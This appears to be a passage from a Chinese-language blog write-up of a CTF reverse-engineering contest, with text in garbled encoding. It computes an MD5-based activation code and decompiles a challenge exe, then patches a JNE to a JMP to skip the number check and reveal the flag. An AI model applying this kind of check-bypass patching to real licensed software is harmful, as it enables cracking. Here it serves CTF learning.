<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">hashlib</span>

<span class="pl-k">def</span> <span class="pl-en">md5_calc</span>(<span class="pl-s1">account</span>):
    <span class="pl-s1">account</span> <span class="pl-c1">+=</span> <span class="pl-s">"@nju.edu.cn"</span>
    
    <span class="pl-c"># è®¡ç®—md5</span>
    <span class="pl-s1">md5_hash</span> <span class="pl-c1">=</span> <span class="pl-s1">hashlib</span>.<span class="pl-c1">md5</span>(<span class="pl-s1">account</span>.<span class="pl-c1">encode</span>(<span class="pl-s">'utf-8'</span>)).<span class="pl-c1">digest</span>()
    
    <span class="pl-c"># è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</span>
    <span class="pl-s1">code</span> <span class="pl-c1">=</span> <span class="pl-s1">md5_hash</span>.<span class="pl-c1">hex</span>().<span class="pl-c1">upper</span>()
    
    <span class="pl-k">return</span> <span class="pl-s1">code</span>

<span class="pl-s1">account</span> <span class="pl-c1">=</span> <span class="pl-s">"itsc"</span>
<span class="pl-s1">code</span> <span class="pl-c1">=</span> <span class="pl-en">md5_calc</span>(<span class="pl-s1">account</span>)
<span class="pl-en">print</span>(<span class="pl-s">f"code: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">code</span><span class="pl-kos">}</span></span>"</span>)</pre></div>
<p>æ‹¿åˆ°æ¿€æ´»ç  <code class="notranslate">15F00E032036724774CF4A2D2CA7C63C</code></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/1f46421e164f7d7b7dfef64d56ca96bf5e05f517fc9b141a93665893f14771e0/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138353630303136392e706e67"><img src="https://camo.githubusercontent.com/1f46421e164f7d7b7dfef64d56ca96bf5e05f517fc9b141a93665893f14771e0/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363138353630303136392e706e67" alt="image-20251006185600169" data-canonical-src="https://nopthon.github.io/image-20251006185600169.png" style="max-width: 100%;"></a></p>
<p>Flag å°±æ˜¯ <code class="notranslate">flag{15F00E032036724774CF4A2D2CA7C63C}</code></p>
<h3>RE03-å¹¸è¿æ•°å­—</h3>
<div class="markdown-alert markdown-alert-warning"><p class="markdown-alert-title"><svg class="octicon octicon-alert mr-2" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>Warning</p>
<p>éå¸¸è§„è§£æ³•æ³¨æ„ï¼Œå’Œæœ¬é¢˜çš„æ­£è§£å‡ ä¹æ²¡æœ‰å…³ç³»</p>
</div>
<p>ä¸‹å‘äº†ä¸€ä¸ª exe æ–‡ä»¶ï¼Œå°è¯•è¿›è¡Œäº¤äº’ï¼ŒçŒœæµ‹è¿™ä¸ªå¹¸è¿æ•°å­—æ˜¯ä¸ªéšæœºæ•°ï¼ŒçŒœä¸ä¸­çš„ï¼š</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f97ea615a87f8ccffa27a315aa79b06d1324c5aadafcbafe1a2326f68a526017/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139303431383839302e706e67"><img src="https://camo.githubusercontent.com/f97ea615a87f8ccffa27a315aa79b06d1324c5aadafcbafe1a2326f68a526017/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139303431383839302e706e67" alt="image-20251006190418890" data-canonical-src="https://nopthon.github.io/image-20251006190418890.png" style="max-width: 100%;"></a></p>
<p>æ³¨æ„åˆ°æç¤ºï¼š</p>
<blockquote>
<p>ä½ å¯èƒ½éœ€è¦äº†è§£ä¸€ä¸‹ [<a href="https://learn.microsoft.com/zh-cn/windows/win32/procthread/using-thread-local-storage" rel="nofollow">TLSï¼ˆçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼‰</a>] å’Œ [<a href="https://learn.microsoft.com/zh-cn/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent" rel="nofollow">IsDebuggerPresent</a>]</p>
</blockquote>
<p>ä¼¼ä¹æ˜¯å¯¹åŠ¨æ€è°ƒè¯•æ“ä½œæœ‰æ‰€ååˆ¶ï¼Œæ‰€ä»¥ä¾æ—§å°è¯• Ghidra é™æ€åˆ†æã€‚å…ˆæœç´¢ä¸€ä¸‹å­—ç¬¦ä¸²ï¼š</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/54de098c5271db4c963f714454cfa543b1c54057a4cc3fda2d082021aa383e28/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139333633313239322e706e67"><img src="https://camo.githubusercontent.com/54de098c5271db4c963f714454cfa543b1c54057a4cc3fda2d082021aa383e28/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139333633313239322e706e67" alt="image-20251006193631292" data-canonical-src="https://nopthon.github.io/image-20251006193631292.png" style="max-width: 100%;"></a></p>
<p>å‘ç°æœ‰å¡«å†™æ­£ç¡®çš„åº†ç¥è¯­å­—ç¬¦ä¸²ï¼Œå®šä½å‡½æ•° <code class="notranslate">FUN00401450</code>ï¼š</p>
<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-k">void</span> __fastcall <span class="pl-en">FUN_00401450</span>(undefined4 param_1,<span class="pl-k">int</span> *param_2)

{
  HANDLE hHandle;
  uint uVar1;
  <span class="pl-k">int</span> iVar2;
  <span class="pl-k">int</span> iVar3;
  HANDLE unaff_EDI;
  uint uStack_54;
  <span class="pl-k">int</span> iStack_4c;
  DWORD DStack_48;
  uint auStack_40 [<span class="pl-c1">15</span>];
  
  auStack_40[<span class="pl-c1">0xe</span>] = DAT_00404000 ^ (uint)&amp;stack0xfffffffc;
  <span class="pl-c1">FUN_004013b0</span>();
                    <span class="pl-c"><span class="pl-c">/*</span> WARNING: Bad instruction - Truncating control flow here <span class="pl-c">*/</span></span>
  <span class="pl-c1">Sleep</span>(<span class="pl-c1">1000</span>);
  auStack_40[<span class="pl-c1">0</span>] = <span class="pl-c1">0xba637da0</span>;
  auStack_40[<span class="pl-c1">1</span>] = <span class="pl-c1">0x8c445f89</span>;
  auStack_40[<span class="pl-c1">2</span>] = <span class="pl-c1">0x112970aa</span>;
  auStack_40[<span class="pl-c1">3</span>] = <span class="pl-c1">0xe2ca658f</span>;
  auStack_40[<span class="pl-c1">4</span>] = <span class="pl-c1">0xbc46a994</span>;
  auStack_40[<span class="pl-c1">5</span>] = <span class="pl-c1">0x7289dd5c</span>;
  auStack_40[<span class="pl-c1">6</span>] = <span class="pl-c1">0x21bd739f</span>;
  auStack_40[<span class="pl-c1">7</span>] = <span class="pl-c1">0x71233bc</span>;
  auStack_40[<span class="pl-c1">8</span>] = <span class="pl-c1">0x67cd6608</span>;
  auStack_40[<span class="pl-c1">9</span>] = <span class="pl-c1">0xf80e72bb</span>;
  auStack_40[<span class="pl-c1">10</span>] = <span class="pl-c1">0xfa7003e0</span>;
  auStack_40[<span class="pl-c1">0xb</span>] = <span class="pl-c1">0xfdc39c15</span>;
  auStack_40[<span class="pl-c1">0xc</span>] = <span class="pl-c1">0x6e7aeeb0</span>;
  auStack_40[<span class="pl-c1">0xd</span>] = <span class="pl-c1">0x34</span>;
  <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>welcome to TrinityCTF<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
  hHandle = (HANDLE)<span class="pl-c1">FUN_004013b0</span>();
  <span class="pl-c1">Sleep</span>(<span class="pl-c1">1000</span>);
  uVar1 = <span class="pl-c1">func_0x00401080</span>();
  <span class="pl-c1">srand</span>(uVar1);
  iVar2 = <span class="pl-c1">rand</span>();
  <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>input your lucky number:<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
  iVar3 = <span class="pl-c1">FUN_00401050</span>(&amp;UNK_00403174);
  <span class="pl-k">if</span> (iVar3 != <span class="pl-c1">1</span>) {
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>invalid input<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
    <span class="pl-c1">WaitForSingleObject</span>(hHandle,<span class="pl-c1">0xffffffff</span>);
    <span class="pl-c1">CloseHandle</span>(unaff_EDI);
    <span class="pl-c1">TlsFree</span>(DStack_48);
    <span class="pl-c1">func_0x004016c3</span>();
    <span class="pl-k">return</span>;
  }
  <span class="pl-k">if</span> (iStack_4c == iVar2) {
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>Congratulations, you guessed right!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
    <span class="pl-c1">FUN_004013b0</span>();
                    <span class="pl-c"><span class="pl-c">/*</span> WARNING: Bad instruction - Truncating control flow here <span class="pl-c">*/</span></span>
    <span class="pl-c1">Sleep</span>(<span class="pl-c1">1000</span>);
    <span class="pl-c1">FUN_00401090</span>(auStack_40,(<span class="pl-k">int</span> *)<span class="pl-c1">0xd</span>,<span class="pl-c1">0x404060</span>,<span class="pl-c1">0</span>);
    uVar1 = auStack_40[<span class="pl-c1">0xd</span>];
    <span class="pl-c1">FUN_00401020</span>(&amp;UNK_004031b0);
    <span class="pl-k">for</span> (uStack_54 = <span class="pl-c1">0</span>; uStack_54 &lt; uVar1; uStack_54 = uStack_54 + <span class="pl-c1">1</span>) {
      <span class="pl-c1">putchar</span>((uint)*(byte *)((<span class="pl-k">int</span>)auStack_40 + uStack_54));
    }
    <span class="pl-c1">FUN_00401020</span>(&amp;UNK_004031b8);
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>Is that really right?<span class="pl-pds">"</span></span>);
  }
  <span class="pl-k">else</span> {
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>number error<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
  }
  <span class="pl-k">return</span>;
}
</pre></div>
<p>å…ˆä¸ç®¡æˆ‘å¦‚ä½•è¾“å…¥æ­£ç¡®çš„æ•°å­—æ‰èƒ½å¾—åˆ° Flagï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨è¿™ä¸€æ®µï¼š</p>
<div class="highlight highlight-source-c++"><pre class="notranslate"><span class="pl-k">if</span> (iStack_4c == iVar2) {
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>Congratulations, you guessed right!<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>);
    <span class="pl-c1">FUN_004013b0</span>(aDStack_48,aDStack_48 + <span class="pl-c1">1</span>);
    <span class="pl-c1">Sleep</span>(<span class="pl-c1">1000</span>);
    <span class="pl-c1">FUN_00401090</span>(<span class="pl-c1">0x404060</span>,<span class="pl-c1">0</span>);
    uVar1 = uStack_c;
    <span class="pl-c1">FUN_00401020</span>(&amp;UNK_004031b0);
    <span class="pl-k">for</span> (uStack_54 = <span class="pl-c1">0</span>; uStack_54 &lt; uVar1; uStack_54 = uStack_54 + <span class="pl-c1">1</span>) {
      <span class="pl-c1">putchar</span>((uint)abStack_40[uStack_54]);
    }
    <span class="pl-c1">FUN_00401020</span>(&amp;UNK_004031b8);
    <span class="pl-c1">FUN_00401020</span>(<span class="pl-s"><span class="pl-pds">"</span>Is that really right?<span class="pl-pds">"</span></span>);
  }</pre></div>
<p>ä½ æ˜¯è¯´ï¼Œåˆ¤å®šä¸ºçŒœæ•°æ­£ç¡®ï¼Œè¾“å‡º Flag åªæœ‰ä¸€ä¸ª <code class="notranslate">if (iStack_4c == iVar2)</code> çš„éªŒè¯å—ï¼Ÿ</p>
<p>å°è¯•æ‰¾åˆ°å¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼š</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/3a7b2be468d3af8083b80b371c2a40917cc9e80478d87c5433bd6f3b27ffe639/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353332363231332e706e67"><img src="https://camo.githubusercontent.com/3a7b2be468d3af8083b80b371c2a40917cc9e80478d87c5433bd6f3b27ffe639/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353332363231332e706e67" alt="image-20251006195326213" data-canonical-src="https://nopthon.github.io/image-20251006195326213.png" style="max-width: 100%;"></a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7f1ae8b16647f98cb66a5866b3dedfe86c86f61b8a5b736d22b3ea1cde760c9f/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353533373031312e706e67"><img src="https://camo.githubusercontent.com/7f1ae8b16647f98cb66a5866b3dedfe86c86f61b8a5b736d22b3ea1cde760c9f/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353533373031312e706e67" alt="image-20251006195537011" data-canonical-src="https://nopthon.github.io/image-20251006195537011.png" style="max-width: 100%;"></a></p>
<p>æˆ‘ä»¬è¿›è¡Œä¿®æ”¹ï¼š</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8aecf897a7ca070ea1bebfae122d7abe9db93b2c3c9c59e18526d422bbd36259/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353834383639312e706e67"><img src="https://camo.githubusercontent.com/8aecf897a7ca070ea1bebfae122d7abe9db93b2c3c9c59e18526d422bbd36259/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363139353834383639312e706e67" alt="image-20251006195848691" data-canonical-src="https://nopthon.github.io/image-20251006195848691.png" style="max-width: 100%;"></a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/9292317166d7b6c393d2373494ff9e05e70e8c57fc66b73969e6ad088ee04915/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303031393830392e706e67"><img src="https://camo.githubusercontent.com/9292317166d7b6c393d2373494ff9e05e70e8c57fc66b73969e6ad088ee04915/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303031393830392e706e67" alt="image-20251006200019809" data-canonical-src="https://nopthon.github.io/image-20251006200019809.png" style="max-width: 100%;"></a></p>
<p>æŠŠ <code class="notranslate">JNE 0x00401670</code> ä¿®æ”¹ä¸º <code class="notranslate">JMP 0x004015b1</code>ï¼Œå¯¼å‡ºä¿®æ”¹åçš„ exe æ–‡ä»¶æ‰“å¼€</p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/980b83ee16935a1aae321e45307789020d7a803ef09872539bcc056b4aa6cade/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303330373536332e706e67"><img src="https://camo.githubusercontent.com/980b83ee16935a1aae321e45307789020d7a803ef09872539bcc056b4aa6cade/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303330373536332e706e67" alt="image-20251006200307563" data-canonical-src="https://nopthon.github.io/image-20251006200307563.png" style="max-width: 100%;"></a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/00a557587809c5a7c5c94e9abbf271cf39e01b2dd6a7130921bcc825bb381530/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303434363836352e706e67"><img src="https://camo.githubusercontent.com/00a557587809c5a7c5c94e9abbf271cf39e01b2dd6a7130921bcc825bb381530/68747470733a2f2f6e6f7074686f6e2e6769746875622e696f2f696d6167652d32303235313030363230303434363836352e706e67" alt="image-20251006200446865" data-canonical-src="https://nopthon.github.io/image-20251006200446865.png" style="max-width: 100%;"></a></p>
<p>äºæ˜¯å¾—åˆ°äº† Flag: <code class="notranslate">flag{c0ngr4tul4t1ons_th1s_1s_3z_lucknumb3r_4nd_xte4}</code></p>
<p>ï¼ˆå…¶å®æˆ‘ä¹Ÿå…³æ³¨äº†ä¸€ä¸‹ Flag æ˜¯æ€ä¹ˆè§£ç å¾—åˆ°çš„ï¼Œä¼¼ä¹åŒ…å« TEA åŠ å¯†è¿‡ç¨‹ï¼Œä½†æ˜¯æˆ‘ä¸€ç›´æ²¡æœ‰è¿›å±•ï¼Œäºæ˜¯é€‰æ‹©äº†æ”¹æ±‡ç¼–ç çš„æ–¹æ¡ˆï¼‰</p>
<p>ï¼ˆä¸ºäº†æ‹¿åˆ° Flag ä¸æ‹©æ‰‹æ®µäº† ğŸ˜ˆï¼‰</p>
<hr>
<p>ï¼ˆ<del>æœ‰ç‚¹é—æ†¾è‡ªå·±æ˜¯ç¬¬ä¸€å¤©ä¸‹åˆæ‰å†³å®šå‚åŠ æ¯”èµ›çš„ï¼Œä¸ç„¶å¯ä»¥æ‹¿ RE çš„ä¸‰ä¸ªä¸€è¡€</del>ï¼‰</p></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">è¯„è®º</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright Â© <span id="copyrightYear"></span> <a href="https://Nopthon.github.io">Nopthon's trashcan</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if("05/29/2025"!=""){
    var startSite=new Date("05/29/2025");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="ç½‘ç«™è¿è¡Œ "+diffDay+" å¤©"+" â€¢ ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

let themeSettings={
    "dark": ["dark","moon","#00f0ff","dark-blue"],
    "light": ["light","sun","#ff5000","github-light"],
    "auto": ["auto","sync","","preferred-color-scheme"]
};
function changeTheme(mode, icon, color, utheme){
    document.documentElement.setAttribute("data-color-mode",mode);
    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
    document.getElementById("themeSwitch").parentNode.style.color=color;
    if(utterancesLoad==1){utterancesTheme(utheme);}
}
function modeSwitch(){
    let currentMode=document.documentElement.getAttribute('data-color-mode');
    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
    localStorage.setItem("meek_theme", newMode);
    if(themeSettings[newMode]){
        changeTheme(...themeSettings[newMode]);
    }
}
function utterancesTheme(theme){
    const message={type:'set-theme',theme: theme};
    const iframe=document.getElementsByClassName('utterances-frame')[0];
    iframe.contentWindow.postMessage(message,'https://utteranc.es');
}
if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.disabled=true;
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","Nopthon/Nopthon.github.io");
    script.setAttribute("issue-term","title");
    
    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
    else{script.setAttribute("theme","preferred-color-scheme");}
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
<script src='https://blog.meekdai.com/Gmeek/plugins/GmeekTOC.js'></script><script src='https://blog.meekdai.com/Gmeek/plugins/lightbox.js'></script>

</html>
